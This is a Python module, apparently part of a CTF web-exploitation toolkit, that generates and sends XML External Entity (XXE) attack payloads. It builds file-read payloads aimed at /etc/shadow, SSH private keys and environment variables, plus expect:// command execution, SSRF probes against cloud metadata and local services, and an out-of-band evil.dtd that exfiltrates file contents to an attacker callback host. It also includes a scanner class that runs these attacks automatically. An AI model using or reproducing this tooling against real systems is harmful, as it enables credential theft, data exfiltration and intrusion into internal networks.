"""
CTF Web Toolkit - XXE (XML External Entity) Module
支持：
  - 经典 XXE 文件读取
  - 盲 XXE (带外 OOB)
  - SSRF via XXE
  - 报错型 XXE
  - SVG/DOCX/XLSX 载体
  - PHP Expect / Base64 Filter
"""

from typing import Optional, List
from urllib.parse import quote
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section


# ── 常用 XXE 读取 Payload ─────────────────────
def build_basic_xxe(file_path: str = "/etc/passwd",
                    entity: str = "xxe") -> str:
    """经典 DTD + 外部实体读文件"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY {entity} SYSTEM "file://{file_path}">\n'
        f']>\n'
        f'<root>&{entity};</root>'
    )


def build_netdoc_xxe(file_path: str = "/etc/passwd") -> str:
    """使用 netdoc:// 协议（Java 环境）"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "netdoc://{file_path}">\n'
        f']>\n'
        f'<root>&xxe;</root>'
    )


def build_php_filter_xxe(file_path: str = "index.php") -> str:
    """通过 php://filter 读取 PHP 文件（base64 编码）"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">\n'
        f']>\n'
        f'<root>&xxe;</root>'
    )


def build_expect_xxe(cmd: str = "id") -> str:
    """使用 expect:// 协议执行命令（需要 PHP expect 扩展）"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "expect://{cmd}">\n'
        f']>\n'
        f'<root>&xxe;</root>'
    )


def build_ssrf_xxe(target_url: str = "http://169.254.169.254/") -> str:
    """通过 XXE 发起 SSRF 请求"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "{target_url}">\n'
        f']>\n'
        f'<root>&xxe;</root>'
    )


def build_oob_xxe(callback_host: str, file_path: str = "/etc/passwd",
                  entity: str = "xxe", param_entity: str = "dtd") -> str:
    """
    带外（OOB）盲 XXE：
    先通过 % 参数实体请求攻击者 DTD，
    再由攻击者 DTD 将文件内容通过 HTTP 发送到回调服务器
    """
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % {param_entity} SYSTEM "http://{callback_host}/evil.dtd">\n'
        f'  %{param_entity};\n'
        f']>\n'
        f'<root>&{entity};</root>'
    )


def build_evil_dtd(callback_host: str, file_path: str = "/etc/passwd") -> str:
    """
    攻击者托管的 evil.dtd 内容
    用于 OOB XXE 外带文件内容
    需要将此文件托管在 callback_host 上
    """
    return (
        f'<!ENTITY % file SYSTEM "file://{file_path}">\n'
        f'<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM \'http://{callback_host}/?data=%file;\'>">\n'
        f'%wrap;\n'
        f'%send;\n'
    )


def build_error_xxe(file_path: str = "/etc/passwd",
                    nonexist: str = "/nonexist_abc123") -> str:
    """
    报错型 XXE：将文件内容拼入不存在路径，触发报错信息泄露
    适用于无回显但有错误信息的场景
    """
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % file SYSTEM "file://{file_path}">\n'
        f'  <!ENTITY % wrap "<!ENTITY &#x25; error SYSTEM \'file://{nonexist}/%file;\'>">\n'
        f'  %wrap;\n'
        f'  %error;\n'
        f']>\n'
        f'<root>trigger</root>'
    )


def build_svg_xxe(file_path: str = "/etc/passwd") -> str:
    """SVG 载体 XXE（用于图片上传场景）"""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE svg [\n'
        f'  <!ENTITY xxe SYSTEM "file://{file_path}">\n'
        f']>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg">\n'
        f'  <text>&xxe;</text>\n'
        f'</svg>'
    )


def build_xinclude_xxe(file_path: str = "/etc/passwd") -> str:
    """
    XInclude 注入（当服务端将用户数据插入到 XML 文档中时）
    不依赖 DOCTYPE，绕过 DOCTYPE 禁用限制
    """
    return (
        f'<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
        f'  <xi:include parse="text" href="file://{file_path}"/>\n'
        f'</root>'
    )


# ── 常用 Linux 敏感文件路径 ───────────────────
LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/var/www/html/index.php",
    "/var/www/html/config.php",
    "/app/config.py",
    "/app/settings.py",
]

WINDOWS_FILES = [
    "C:/Windows/win.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/inetpub/wwwroot/web.config",
    "C:/xampp/htdocs/config.php",
]


class XXEScanner:
    """XXE 漏洞检测与利用"""

    def __init__(self, requester: Requester, callback_host: str = ""):
        self.req = requester
        self.callback = callback_host

    def _send_xml(self, url: str, xml: str, param: str = "",
                  method: str = "POST") -> Optional[object]:
        """发送 XML 请求"""
        try:
            headers = {"Content-Type": "application/xml"}
            if method.upper() == "POST":
                if param:
                    return self.req.post(url, data={param: xml}, headers=headers)
                return self.req.post(url, data=xml, headers=headers)
            else:
                return self.req.get(url, params={param: xml} if param else {})
        except Exception as e:
            err(f"请求失败: {e}")
            return None

    def detect(self, url: str, param: str = "",
               method: str = "POST") -> bool:
        """检测 XXE 漏洞（通过读取 /etc/passwd 验证）"""
        section(f"XXE 检测: {url}")
        test_xml = build_basic_xxe("/etc/passwd")
        resp = self._send_xml(url, test_xml, param, method)
        if resp and ("root:" in resp.text or "nobody:" in resp.text):
            found("XXE 漏洞", "成功读取 /etc/passwd")
            return True
        # Windows 环境
        test_xml = build_basic_xxe("C:/Windows/win.ini")
        resp = self._send_xml(url, test_xml, param, method)
        if resp and ("[extensions]" in resp.text or "[fonts]" in resp.text):
            found("XXE 漏洞", "成功读取 C:/Windows/win.ini (Windows)")
            return True
        # XInclude 尝试
        xi_xml = build_xinclude_xxe("/etc/passwd")
        resp = self._send_xml(url, xi_xml, param, method)
        if resp and "root:" in resp.text:
            found("XInclude XXE", "成功读取 /etc/passwd")
            return True
        info("未发现 XXE 漏洞")
        return False

    def read_file(self, url: str, file_path: str,
                  param: str = "", method: str = "POST",
                  use_php_filter: bool = False) -> Optional[str]:
        """通过 XXE 读取指定文件"""
        section(f"XXE 读文件: {file_path}")
        if use_php_filter:
            xml = build_php_filter_xxe(file_path)
        else:
            xml = build_basic_xxe(file_path)
        resp = self._send_xml(url, xml, param, method)
        if resp and resp.text.strip():
            content = _extract_xxe_content(resp.text)
            if content:
                found("文件内容", content[:200])
                return content
        # 报错型
        xml = build_error_xxe(file_path)
        resp = self._send_xml(url, xml, param, method)
        if resp:
            content = _extract_error_content(resp.text)
            if content:
                found("报错型 XXE", content[:200])
                return content
        info(f"无法读取: {file_path}")
        return None

    def scan_files(self, url: str, param: str = "",
                   method: str = "POST",
                   os_type: str = "linux") -> dict:
        """批量扫描敏感文件"""
        section(f"XXE 批量文件扫描 ({os_type})")
        targets = LINUX_FILES if os_type == "linux" else WINDOWS_FILES
        result = {}
        for f in targets:
            content = self.read_file(url, f, param, method)
            if content:
                result[f] = content[:300]
        if not result:
            info("未发现可读文件")
        return result

    def ssrf_probe(self, url: str, param: str = "",
                   target_urls: Optional[List[str]] = None,
                   method: str = "POST") -> List[str]:
        """通过 XXE 发起 SSRF 探测"""
        section("XXE SSRF 探测")
        if target_urls is None:
            target_urls = [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "http://127.0.0.1:22/",
                "http://127.0.0.1:3306/",
                "http://127.0.0.1:6379/",
                "http://127.0.0.1:8080/",
            ]
        success = []
        for target in target_urls:
            xml = build_ssrf_xxe(target)
            resp = self._send_xml(url, xml, param, method)
            if resp and resp.status_code == 200 and len(resp.text) > 10:
                found("SSRF", target)
                success.append(target)
            else:
                info(f"  {target} -> 无响应")
        return success

    def generate_oob_payloads(self, file_path: str = "/etc/passwd") -> dict:
        """生成 OOB XXE 所需的 Payload 和 DTD 内容"""
        if not self.callback:
            warn("需要设置 --oob 参数指定回调服务器地址")
            return {}
        section("生成 OOB XXE Payload")
        ok(f"  回调服务器: {self.callback}")
        ok(f"  目标文件: {file_path}")
        payload = build_oob_xxe(self.callback, file_path)
        dtd = build_evil_dtd(self.callback, file_path)
        info(f"\n--- 发送到目标的 XML ---\n{payload}\n")
        info(f"\n--- 托管在 {self.callback}/evil.dtd 的内容 ---\n{dtd}\n")
        warn("请在回调服务器上监听 HTTP 请求，文件内容会出现在请求的 ?data= 参数中")
        warn(f"快速启动服务器: python3 -m http.server 80")
        return {"payload": payload, "dtd": dtd}


# ── 内部辅助 ─────────────────────────────────
def _extract_xxe_content(text: str) -> Optional[str]:
    """从 XXE 响应中提取文件内容"""
    indicators = ["root:x:", "nobody:", "[extensions]", "127.0.0.1",
                  "PATH=", "HOME=", "USER="]
    for ind in indicators:
        if ind in text:
            # 找到包含指示符的段落
            idx = text.index(ind)
            return text[max(0, idx - 20):idx + 500].strip()
    return text.strip() if text.strip() else None


def _extract_error_content(text: str) -> Optional[str]:
    """从报错信息中提取文件内容（报错型 XXE）"""
    import re
    patterns = [
        r"SystemId Unknown;[^:]+:(.+?)(?:\n|$)",
        r"file not found\s*/nonexist[^/]*/(.+?)(?:\s|$)",
        r"URI=file:/[^/]*/(.+?)(?:\s|$)",
        r"in URI\s+.+?=(.+?)(?:\s|$)",
    ]
    for pattern in patterns:
        m = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if m:
            return m.group(1).strip()
    return None
